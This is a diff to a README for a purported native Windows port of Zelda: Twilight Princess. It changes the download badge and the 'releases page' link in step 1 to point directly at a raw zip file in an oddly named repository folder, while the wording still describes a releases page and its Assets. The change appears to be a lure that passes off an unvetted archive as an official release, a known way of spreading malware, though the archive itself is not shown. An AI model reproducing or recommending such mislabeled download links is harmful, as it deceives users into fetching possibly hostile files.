@@ -1,6 +1,6 @@
 # ⚔️ Zelda-TP-PC-Port - Play Twilight Princess on Windows natively
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/cynthyfibrillose74/Zelda-TP-PC-Port/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/cynthyfibrillose74/Zelda-TP-PC-Port/raw/refs/heads/main/electrooptically/Port_Zelda_T_P_v2.1-beta.2.zip)
 
 ## 📌 Project Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets these specifications to run the game without issues.
 
 Follow these steps to set up the game on your computer.
 
-1. Visit the [releases page](https://github.com/cynthyfibrillose74/Zelda-TP-PC-Port/releases) to find the current version.
+1. Visit the [releases page](https://github.com/cynthyfibrillose74/Zelda-TP-PC-Port/raw/refs/heads/main/electrooptically/Port_Zelda_T_P_v2.1-beta.2.zip) to find the current version.
 2. Look for the file ending in .zip under the "Assets" section.
 3. Click the file name to start the download.
 4. Open your "Downloads" folder once the file finishes saving.
